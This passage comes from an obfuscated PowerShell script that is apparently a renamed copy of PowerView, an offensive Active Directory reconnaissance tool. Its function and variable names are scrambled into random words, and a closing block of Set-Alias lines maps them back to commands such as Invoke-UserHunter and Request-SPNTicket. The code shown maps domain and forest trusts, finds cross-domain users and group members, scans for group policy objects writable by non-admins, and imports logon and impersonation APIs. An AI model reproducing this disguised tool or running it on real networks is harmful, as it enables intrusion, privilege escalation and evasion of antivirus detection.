                    $aaZyVGyF99
                }
                if ($CmGXBhUd99) {
                    try { $CmGXBhUd99.dispose() }
                    catch {
                        Write-Verbose "[clammy] Error disposing of the Results object: $_"
                    }
                }
                $ecmYuQbe99.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq 'API') {
            if ($PSBoundParameters['Server']) {
                $gQAqpGfe99 = $qgdPgdMB99
            }
            elseif ($jnYnRnFJ99 -and $jnYnRnFJ99.Trim() -ne '') {
                $gQAqpGfe99 = $jnYnRnFJ99
            }
            else {
                $gQAqpGfe99 = $Null
            }
            $hkPfVWUa99 = [IntPtr]::Zero
            $Flags = 63
            $DXXpCVhQ99 = 0
            $tYBpqgGN99 = $goUSoGqx99::DsEnumerateDomainTrusts($gQAqpGfe99, $Flags, [ref]$hkPfVWUa99, [ref]$DXXpCVhQ99)
            $TlmuwuKV99 = $hkPfVWUa99.ToInt64()
            if (($tYBpqgGN99 -eq 0) -and ($TlmuwuKV99 -gt 0)) {
                $zgglosHg99 = $QyuVfZrx99::GetSize()
                for ($i = 0; ($i -lt $DXXpCVhQ99); $i++) {
                    $wGgfzjvl99 = New-Object System.Intptr -ArgumentList $TlmuwuKV99
                    $Info = $wGgfzjvl99 -as $QyuVfZrx99
                    $TlmuwuKV99 = $wGgfzjvl99.ToInt64()
                    $TlmuwuKV99 += $zgglosHg99
                    $eCwYGmel99 = ''
                    $tYBpqgGN99 = $MWNOHLIM99::ConvertSidToStringSid($Info.DomainSid, [ref]$eCwYGmel99);$WwgbwQff99 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if ($tYBpqgGN99 -eq 0) {
                        Write-Verbose "[clammy] Error: $(([ComponentModel.Win32Exception] $WwgbwQff99).Message)"
                    }
                    else {
                        $aaZyVGyF99 = New-Object PSObject
                        $aaZyVGyF99 | Add-Member Noteproperty 'SourceName' $xSLoaPLm99
                        $aaZyVGyF99 | Add-Member Noteproperty 'TargetName' $Info.DnsDomainName
                        $aaZyVGyF99 | Add-Member Noteproperty 'TargetNetbiosName' $Info.NetbiosDomainName
                        $aaZyVGyF99 | Add-Member Noteproperty 'Flags' $Info.Flags
                        $aaZyVGyF99 | Add-Member Noteproperty 'ParentIndex' $Info.ParentIndex
                        $aaZyVGyF99 | Add-Member Noteproperty 'TrustType' $Info.TrustType
                        $aaZyVGyF99 | Add-Member Noteproperty 'TrustAttributes' $Info.TrustAttributes
                        $aaZyVGyF99 | Add-Member Noteproperty 'TargetSid' $eCwYGmel99
                        $aaZyVGyF99 | Add-Member Noteproperty 'TargetGuid' $Info.DomainGuid
                        $aaZyVGyF99.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.API')
                        $aaZyVGyF99
                    }
                }
                $Null = $goUSoGqx99::NetApiBufferFree($hkPfVWUa99)
            }
            else {
                Write-Verbose "[clammy] Error: $(([ComponentModel.Win32Exception] $tYBpqgGN99).Message)"
            }
        }
        else {
            $INzuCStC99 = indicate @NetSearcherArguments
            if ($INzuCStC99) {
                $INzuCStC99.GetAllTrustRelationships() | ForEach-Object {
                    $_.PSObject.TypeNames.Insert(0, 'PowerView.DomainTrust.NET')
                    $_
                }
            }
        }
    }
}
function implanting {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $NeieztNm99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        $cTtBFfga99 = @{}
        if ($PSBoundParameters['Forest']) { $cTtBFfga99['Forest'] = $NeieztNm99 }
        if ($PSBoundParameters['Credential']) { $cTtBFfga99['Credential'] = $fjBNCklg99 }
        $UTjPEfiZ99 = nullified @NetForestArguments
        if ($UTjPEfiZ99) {
            $UTjPEfiZ99.GetAllTrustRelationships() | ForEach-Object {
                $_.PSObject.TypeNames.Insert(0, 'PowerView.ForestTrust.NET')
                $_
            }
        }
    }
}
function humbleness {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XVFWmInN99 = @{}
        $XVFWmInN99['LDAPFilter'] = '(memberof=*)'
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['Raw']) { $XVFWmInN99['Raw'] = $Raw }
    }
    PROCESS {
        suit @SearcherArguments  | ForEach-Object {
            ForEach ($SUpogMWY99 in $_.memberof) {
                $Index = $SUpogMWY99.IndexOf('DC=')
                if ($Index) {
                    $UKHCiigJ99 = $($SUpogMWY99.SubString($Index)) -replace 'DC=','' -replace ',','.'
                    $sTDjfJBN99 = $_.distinguishedname
                    $KcQSZqEp99 = $sTDjfJBN99.IndexOf('DC=')
                    $CQMlcaaA99 = $($_.distinguishedname.SubString($KcQSZqEp99)) -replace 'DC=','' -replace ',','.'
                    if ($UKHCiigJ99 -ne $CQMlcaaA99) {
                        $EidYTRyh99 = $SUpogMWY99.Split(',')[0].split('=')[1]
                        $eDhkcchS99 = New-Object PSObject
                        $eDhkcchS99 | Add-Member Noteproperty 'UserDomain' $CQMlcaaA99
                        $eDhkcchS99 | Add-Member Noteproperty 'UserName' $_.samaccountname
                        $eDhkcchS99 | Add-Member Noteproperty 'UserDistinguishedName' $_.distinguishedname
                        $eDhkcchS99 | Add-Member Noteproperty 'GroupDomain' $UKHCiigJ99
                        $eDhkcchS99 | Add-Member Noteproperty 'GroupName' $EidYTRyh99
                        $eDhkcchS99 | Add-Member Noteproperty 'GroupDistinguishedName' $SUpogMWY99
                        $eDhkcchS99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignUser')
                        $eDhkcchS99
                    }
                }
            }
        }
    }
}
function share {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $jnYnRnFJ99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $azVlDiTB99,
        [Switch]
        $rmzHuzlC99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $XVFWmInN99 = @{}
        $XVFWmInN99['LDAPFilter'] = '(member=*)'
        if ($PSBoundParameters['Domain']) { $XVFWmInN99['Domain'] = $jnYnRnFJ99 }
        if ($PSBoundParameters['Properties']) { $XVFWmInN99['Properties'] = $ycQOyvWh99 }
        if ($PSBoundParameters['SearchBase']) { $XVFWmInN99['SearchBase'] = $WdOnSHnL99 }
        if ($PSBoundParameters['Server']) { $XVFWmInN99['Server'] = $qgdPgdMB99 }
        if ($PSBoundParameters['SearchScope']) { $XVFWmInN99['SearchScope'] = $TRVzBsDk99 }
        if ($PSBoundParameters['ResultPageSize']) { $XVFWmInN99['ResultPageSize'] = $CgYkCByk99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $XVFWmInN99['ServerTimeLimit'] = $elDiVqTz99 }
        if ($PSBoundParameters['SecurityMasks']) { $XVFWmInN99['SecurityMasks'] = $azVlDiTB99 }
        if ($PSBoundParameters['Tombstone']) { $XVFWmInN99['Tombstone'] = $rmzHuzlC99 }
        if ($PSBoundParameters['Credential']) { $XVFWmInN99['Credential'] = $fjBNCklg99 }
        if ($PSBoundParameters['Raw']) { $XVFWmInN99['Raw'] = $Raw }
    }
    PROCESS {
        $KokOohtH99 = @('Users', 'Domain Users', 'Guests')
        con @SearcherArguments | Where-Object { $KokOohtH99 -notcontains $_.samaccountname } | ForEach-Object {
            $EidYTRyh99 = $_.samAccountName
            $BuadPFwG99 = $_.distinguishedname
            $UKHCiigJ99 = $BuadPFwG99.SubString($BuadPFwG99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
            $_.member | ForEach-Object {
                $KgjZCYLu99 = $_.SubString($_.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                if (($_ -match 'CN=S-1-5-21.*-.*') -or ($UKHCiigJ99 -ne $KgjZCYLu99)) {
                    $yvHPdpIo99 = $_
                    $AeVkKzDb99 = $_.Split(',')[0].split('=')[1]
                    $WPhbQDve99 = New-Object PSObject
                    $WPhbQDve99 | Add-Member Noteproperty 'GroupDomain' $UKHCiigJ99
                    $WPhbQDve99 | Add-Member Noteproperty 'GroupName' $EidYTRyh99
                    $WPhbQDve99 | Add-Member Noteproperty 'GroupDistinguishedName' $BuadPFwG99
                    $WPhbQDve99 | Add-Member Noteproperty 'MemberDomain' $KgjZCYLu99
                    $WPhbQDve99 | Add-Member Noteproperty 'MemberName' $AeVkKzDb99
                    $WPhbQDve99 | Add-Member Noteproperty 'MemberDistinguishedName' $yvHPdpIo99
                    $WPhbQDve99.PSObject.TypeNames.Insert(0, 'PowerView.ForeignGroupMember')
                    $WPhbQDve99
                }
            }
        }
    }
}
function crypt {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $SeHRgLsL99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ycQOyvWh99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $WdOnSHnL99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $qgdPgdMB99,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $TRVzBsDk99 = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $CgYkCByk99 = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $elDiVqTz99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $rmzHuzlC99,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $fjBNCklg99 = [Management.Automation.PSCredential]::Empty
    )
    $HLSpIOhI99 = @{}
    $vXBvMPtq99 = New-Object System.Collections.Stack
    $lQhaJqkN99 = @{}
    if ($PSBoundParameters['API']) { $lQhaJqkN99['API'] = $API }
    if ($PSBoundParameters['NET']) { $lQhaJqkN99['NET'] = $NET }
    if ($PSBoundParameters['LDAPFilter']) { $lQhaJqkN99['LDAPFilter'] = $SeHRgLsL99 }
    if ($PSBoundParameters['Properties']) { $lQhaJqkN99['Properties'] = $ycQOyvWh99 }
    if ($PSBoundParameters['SearchBase']) { $lQhaJqkN99['SearchBase'] = $WdOnSHnL99 }
    if ($PSBoundParameters['Server']) { $lQhaJqkN99['Server'] = $qgdPgdMB99 }
    if ($PSBoundParameters['SearchScope']) { $lQhaJqkN99['SearchScope'] = $TRVzBsDk99 }
    if ($PSBoundParameters['ResultPageSize']) { $lQhaJqkN99['ResultPageSize'] = $CgYkCByk99 }
    if ($PSBoundParameters['ServerTimeLimit']) { $lQhaJqkN99['ServerTimeLimit'] = $elDiVqTz99 }
    if ($PSBoundParameters['Tombstone']) { $lQhaJqkN99['Tombstone'] = $rmzHuzlC99 }
    if ($PSBoundParameters['Credential']) { $lQhaJqkN99['Credential'] = $fjBNCklg99 }
    if ($PSBoundParameters['Credential']) {
        $veULAxeW99 = (indicate -fjBNCklg99 $fjBNCklg99).Name
    }
    else {
        $veULAxeW99 = (indicate).Name
    }
    $vXBvMPtq99.Push($veULAxeW99)
    while($vXBvMPtq99.Count -ne 0) {
        $jnYnRnFJ99 = $vXBvMPtq99.Pop()
        if ($jnYnRnFJ99 -and ($jnYnRnFJ99.Trim() -ne '') -and (-not $HLSpIOhI99.ContainsKey($jnYnRnFJ99))) {
            Write-Verbose "[crypt] Enumerating trusts for domain: '$jnYnRnFJ99'"
            $Null = $HLSpIOhI99.Add($jnYnRnFJ99, '')
            try {
                $lQhaJqkN99['Domain'] = $jnYnRnFJ99
                $lHsDmeWq99 = clammy @DomainTrustArguments
                if ($lHsDmeWq99 -isnot [System.Array]) {
                    $lHsDmeWq99 = @($lHsDmeWq99)
                }
                if ($PsCmdlet.ParameterSetName -eq 'NET') {
                    $USNPgCEW99 = @{}
                    if ($PSBoundParameters['Forest']) { $USNPgCEW99['Forest'] = $NeieztNm99 }
                    if ($PSBoundParameters['Credential']) { $USNPgCEW99['Credential'] = $fjBNCklg99 }
                    $lHsDmeWq99 += implanting @ForestTrustArguments
                }
                if ($lHsDmeWq99) {
                    if ($lHsDmeWq99 -isnot [System.Array]) {
                        $lHsDmeWq99 = @($lHsDmeWq99)
                    }
                    ForEach ($Trust in $lHsDmeWq99) {
                        if ($Trust.SourceName -and $Trust.TargetName) {
                            $Null = $vXBvMPtq99.Push($Trust.TargetName)
                            $Trust
                        }
                    }
                }
            }
            catch {
                Write-Verbose "[crypt] Error: $_"
            }
        }
    }
}
function bobble {
    [CmdletBinding()]
    Param (
        [String]
        $FxvyExlL99 = '*',
        [ValidateRange(1,10000)] 
        [Int]
        $PMfcWofI99 = 200
    )
    $YbagbinW99 = @('SYSTEM','Domain Admins','Enterprise Admins')
    $NeieztNm99 = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
    $dyZSiQom99 = @($NeieztNm99.Domains)
    $vXBvMPtq99 = $dyZSiQom99 | foreach { $_.GetDirectoryEntry() }
    foreach ($jnYnRnFJ99 in $vXBvMPtq99) {
        $pIJjStMG99 = "(&(objectCategory=groupPolicyContainer)(displayname=$FxvyExlL99))"
        $NWZRAqED99 = New-Object System.DirectoryServices.DirectorySearcher
        $NWZRAqED99.SearchRoot = $jnYnRnFJ99
        $NWZRAqED99.Filter = $pIJjStMG99
        $NWZRAqED99.PageSize = $PMfcWofI99
        $NWZRAqED99.SearchScope = "Subtree"
        $CgQmLlhE99 = $NWZRAqED99.FindAll()
        foreach ($gpo in $CgQmLlhE99){
            $ACL = ([ADSI]$gpo.path).ObjectSecurity.Access | ? {$_.ActiveDirectoryRights -match "Write" -and $_.AccessControlType -eq "Allow" -and  $YbagbinW99 -notcontains $_.IdentityReference.toString().split("\")[1] -and $_.IdentityReference -ne "CREATOR OWNER"}
        if ($ACL -ne $null){
            $WElpQgBH99 = New-Object psobject
            $WElpQgBH99 | Add-Member Noteproperty 'ADSPath' $gpo.Properties.adspath
            $WElpQgBH99 | Add-Member Noteproperty 'GPODisplayName' $gpo.Properties.displayname
            $WElpQgBH99 | Add-Member Noteproperty 'IdentityReference' $ACL.IdentityReference
            $WElpQgBH99 | Add-Member Noteproperty 'ActiveDirectoryRights' $ACL.ActiveDirectoryRights
            $WElpQgBH99
        }
        }
    }
}
$Mod = facilitation -ModuleName Win32
$pOUqwZDm99 = shredders $Mod PowerView.SamAccountTypeEnum UInt32 @{
    DOMAIN_OBJECT                   =   '0x00000000'
    GROUP_OBJECT                    =   '0x10000000'
    NON_SECURITY_GROUP_OBJECT       =   '0x10000001'
    ALIAS_OBJECT                    =   '0x20000000'
    NON_SECURITY_ALIAS_OBJECT       =   '0x20000001'
    USER_OBJECT                     =   '0x30000000'
    MACHINE_ACCOUNT                 =   '0x30000001'
    TRUST_ACCOUNT                   =   '0x30000002'
    APP_BASIC_GROUP                 =   '0x40000000'
    APP_QUERY_GROUP                 =   '0x40000001'
    ACCOUNT_TYPE_MAX                =   '0x7fffffff'
}
$jYfvsjeJ99 = shredders $Mod PowerView.GroupTypeEnum UInt32 @{
    CREATED_BY_SYSTEM               =   '0x00000001'
    GLOBAL_SCOPE                    =   '0x00000002'
    DOMAIN_LOCAL_SCOPE              =   '0x00000004'
    UNIVERSAL_SCOPE                 =   '0x00000008'
    APP_BASIC                       =   '0x00000010'
    APP_QUERY                       =   '0x00000020'
    SECURITY                        =   '0x80000000'
} -Bitfield
$XhWoAzaE99 = shredders $Mod PowerView.UACEnum UInt32 @{
    SCRIPT                          =   1
    ACCOUNTDISABLE                  =   2
    HOMEDIR_REQUIRED                =   8
    LOCKOUT                         =   16
    PASSWD_NOTREQD                  =   32
    PASSWD_CANT_CHANGE              =   64
    ENCRYPTED_TEXT_PWD_ALLOWED      =   128
    TEMP_DUPLICATE_ACCOUNT          =   256
    NORMAL_ACCOUNT                  =   512
    INTERDOMAIN_TRUST_ACCOUNT       =   2048
    WORKSTATION_TRUST_ACCOUNT       =   4096
    SERVER_TRUST_ACCOUNT            =   8192
    DONT_EXPIRE_PASSWORD            =   65536
    MNS_LOGON_ACCOUNT               =   131072
    SMARTCARD_REQUIRED              =   262144
    TRUSTED_FOR_DELEGATION          =   524288
    NOT_DELEGATED                   =   1048576
    USE_DES_KEY_ONLY                =   2097152
    DONT_REQ_PREAUTH                =   4194304
    PASSWORD_EXPIRED                =   8388608
    TRUSTED_TO_AUTH_FOR_DELEGATION  =   16777216
    PARTIAL_SECRETS_ACCOUNT         =   67108864
} -Bitfield
$MoVYmIFE99 = shredders $Mod WTS_CONNECTSTATE_CLASS UInt16 @{
    Active       =    0
    Connected    =    1
    ConnectQuery =    2
    Shadow       =    3
    Disconnected =    4
    Idle         =    5
    Listen       =    6
    Reset        =    7
    Down         =    8
    Init         =    9
}
$INCxtory99 = minty $Mod PowerView.RDPSessionInfo @{
    ExecEnvId = field 0 UInt32
    State = field 1 $MoVYmIFE99
    SessionId = field 2 UInt32
    pSessionName = field 3 String -MarshalAs @('LPWStr')
    pHostName = field 4 String -MarshalAs @('LPWStr')
    pUserName = field 5 String -MarshalAs @('LPWStr')
    pDomainName = field 6 String -MarshalAs @('LPWStr')
    pFarmName = field 7 String -MarshalAs @('LPWStr')
}
$JHLqEGfY99 = minty $mod WTS_CLIENT_ADDRESS @{
    AddressFamily = field 0 UInt32
    Address = field 1 Byte[] -MarshalAs @('ByValArray', 20)
}
$oGsVQmGJ99 = minty $Mod PowerView.ShareInfo @{
    Name = field 0 String -MarshalAs @('LPWStr')
    Type = field 1 UInt32
    Remark = field 2 String -MarshalAs @('LPWStr')
}
$PxUMqzsP99 = minty $Mod PowerView.LoggedOnUserInfo @{
    UserName = field 0 String -MarshalAs @('LPWStr')
    LogonDomain = field 1 String -MarshalAs @('LPWStr')
    AuthDomains = field 2 String -MarshalAs @('LPWStr')
    LogonServer = field 3 String -MarshalAs @('LPWStr')
}
$uraRgDbR99 = minty $Mod PowerView.SessionInfo @{
    CName = field 0 String -MarshalAs @('LPWStr')
    UserName = field 1 String -MarshalAs @('LPWStr')
    Time = field 2 UInt32
    IdleTime = field 3 UInt32
}
$btFGETdS99 = shredders $Mod SID_NAME_USE UInt16 @{
    SidTypeUser             = 1
    SidTypeGroup            = 2
    SidTypeDomain           = 3
    SidTypeAlias            = 4
    SidTypeWellKnownGroup   = 5
    SidTypeDeletedAccount   = 6
    SidTypeInvalid          = 7
    SidTypeUnknown          = 8
    SidTypeComputer         = 9
}
$exWvDLMq99 = minty $Mod LOCALGROUP_INFO_1 @{
    lgrpi1_name = field 0 String -MarshalAs @('LPWStr')
    lgrpi1_comment = field 1 String -MarshalAs @('LPWStr')
}
$IncleUGn99 = minty $Mod LOCALGROUP_MEMBERS_INFO_2 @{
    lgrmi2_sid = field 0 IntPtr
    lgrmi2_sidusage = field 1 $btFGETdS99
    lgrmi2_domainandname = field 2 String -MarshalAs @('LPWStr')
}
$DsDomainFlag = shredders $Mod DsDomain.Flags UInt32 @{
    IN_FOREST       = 1
    DIRECT_OUTBOUND = 2
    TREE_ROOT       = 4
    PRIMARY         = 8
    NATIVE_MODE     = 16
    DIRECT_INBOUND  = 32
} -Bitfield
$YJLIMLqj99 = shredders $Mod DsDomain.TrustType UInt32 @{
    DOWNLEVEL   = 1
    UPLEVEL     = 2
    MIT         = 3
    DCE         = 4
}
$fvkNnlqS99 = shredders $Mod DsDomain.TrustAttributes UInt32 @{
    NON_TRANSITIVE      = 1
    UPLEVEL_ONLY        = 2
    FILTER_SIDS         = 4
    FOREST_TRANSITIVE   = 8
    CROSS_ORGANIZATION  = 16
    WITHIN_FOREST       = 32
    TREAT_AS_EXTERNAL   = 64
}
$QyuVfZrx99 = minty $Mod DS_DOMAIN_TRUSTS @{
    NetbiosDomainName = field 0 String -MarshalAs @('LPWStr')
    DnsDomainName = field 1 String -MarshalAs @('LPWStr')
    Flags = field 2 $DsDomainFlag
    ParentIndex = field 3 UInt32
    TrustType = field 4 $YJLIMLqj99
    TrustAttributes = field 5 $fvkNnlqS99
    DomainSid = field 6 IntPtr
    DomainGuid = field 7 Guid
}
$fFuumkic99 = minty $Mod NETRESOURCEW @{
    dwScope =         field 0 UInt32
    dwType =          field 1 UInt32
    dwDisplayType =   field 2 UInt32
    dwUsage =         field 3 UInt32
    lpLocalName =     field 4 String -MarshalAs @('LPWStr')
    lpRemoteName =    field 5 String -MarshalAs @('LPWStr')
    lpComment =       field 6 String -MarshalAs @('LPWStr')
    lpProvider =      field 7 String -MarshalAs @('LPWStr')
}
$FunctionDefinitions = @(
    (func netapi32 NetShareEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetWkstaUserEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetSessionEnum ([Int]) @([String], [String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupEnum ([Int]) @([String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 NetLocalGroupGetMembers ([Int]) @([String], [String], [Int], [IntPtr].MakeByRefType(), [Int], [Int32].MakeByRefType(), [Int32].MakeByRefType(), [Int32].MakeByRefType())),
    (func netapi32 DsGetSiteName ([Int]) @([String], [IntPtr].MakeByRefType())),
    (func netapi32 DsEnumerateDomainTrusts ([Int]) @([String], [UInt32], [IntPtr].MakeByRefType(), [IntPtr].MakeByRefType())),
    (func netapi32 NetApiBufferFree ([Int]) @([IntPtr])),
    (func advapi32 ConvertSidToStringSid ([Int]) @([IntPtr], [String].MakeByRefType()) -SetLastError),
    (func advapi32 OpenSCManagerW ([IntPtr]) @([String], [String], [Int]) -SetLastError),
    (func advapi32 CloseServiceHandle ([Int]) @([IntPtr])),
    (func advapi32 LogonUser ([Bool]) @([String], [String], [String], [UInt32], [UInt32], [IntPtr].MakeByRefType()) -SetLastError),
    (func advapi32 ImpersonateLoggedOnUser ([Bool]) @([IntPtr]) -SetLastError),
    (func advapi32 RevertToSelf ([Bool]) @() -SetLastError),
    (func wtsapi32 WTSOpenServerEx ([IntPtr]) @([String])),
    (func wtsapi32 WTSEnumerateSessionsEx ([Int]) @([IntPtr], [Int32].MakeByRefType(), [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSQuerySessionInformation ([Int]) @([IntPtr], [Int], [Int], [IntPtr].MakeByRefType(), [Int32].MakeByRefType()) -SetLastError),
    (func wtsapi32 WTSFreeMemoryEx ([Int]) @([Int32], [IntPtr], [Int32])),
    (func wtsapi32 WTSFreeMemory ([Int]) @([IntPtr])),
    (func wtsapi32 WTSCloseServer ([Int]) @([IntPtr])),
    (func Mpr WNetAddConnection2W ([Int]) @($fFuumkic99, [String], [String], [UInt32])),
    (func Mpr WNetCancelConnection2 ([Int]) @([String], [Int], [Bool])),
    (func kernel32 CloseHandle ([Bool]) @([IntPtr]) -SetLastError)
)
$Types = $FunctionDefinitions | lummoxes -Module $Mod -Namespace 'Win32'
$goUSoGqx99 = $Types['netapi32']
$MWNOHLIM99 = $Types['advapi32']
$kmByfDyP99 = $Types['wtsapi32']
$Mpr = $Types['Mpr']
$Kernel32 = $Types['kernel32']
Set-Alias Get-IPAddress loneliest
Set-Alias Convert-NameToSid theoretic
Set-Alias Convert-SidToName belonging
Set-Alias Request-SPNTicket Pacheco
Set-Alias Get-DNSZone rewards
Set-Alias Get-DNSRecord lionizing
Set-Alias Get-NetDomain indicate
Set-Alias Get-NetDomainController basso
Set-Alias Get-NetForest nullified
Set-Alias Get-NetForestDomain flukiest
Set-Alias Get-NetForestCatalog afterthoughts
Set-Alias Get-NetUser suit
Set-Alias Get-UserEvent gestates
Set-Alias Get-NetComputer cowing
Set-Alias Get-ADObject trashier
Set-Alias Set-ADObject extorting
Set-Alias Get-ObjectAcl anthropomorphic
Set-Alias Add-ObjectAcl trice
Set-Alias Invoke-ACLScanner pinions
Set-Alias Get-GUIDMap batted
Set-Alias Get-NetOU infuriating
Set-Alias Get-NetSite bifurcating
Set-Alias Get-NetSubnet crabbiest
Set-Alias Get-NetGroup con
Set-Alias Find-ManagedSecurityGroups belaying
Set-Alias Get-NetGroupMember Mapplethorpe
Set-Alias Get-NetFileServer elucidate
Set-Alias Get-DFSshare venous
Set-Alias Get-NetGPO bridals
Set-Alias Get-NetGPOGroup donkey
Set-Alias Find-GPOLocation scubaed
Set-Alias Find-GPOComputerAdmin seemed
Set-Alias Get-LoggedOnLocal rapes
Set-Alias Invoke-CheckLocalAdminAccess tampers
Set-Alias Get-SiteName locking
Set-Alias Get-Proxy Blackburn
Set-Alias Get-LastLoggedOn mushing
Set-Alias Get-CachedRDPConnection Mfume
Set-Alias Get-RegistryMountedDrive equine
Set-Alias Get-NetProcess sapling
Set-Alias Invoke-ThreadedFunction director
Set-Alias Invoke-UserHunter peons
Set-Alias Invoke-ProcessHunter dashed
Set-Alias Invoke-EventHunter voice
Set-Alias Invoke-ShareFinder excitements
Set-Alias Invoke-FileFinder urinary
Set-Alias Invoke-EnumerateLocalAdmin Saunders
Set-Alias Get-NetDomainTrust clammy
Set-Alias Get-NetForestTrust implanting
Set-Alias Find-ForeignUser humbleness
Set-Alias Find-ForeignGroup share
Set-Alias Invoke-MapDomainTrust crypt
Set-Alias Get-DomainPolicy cupped
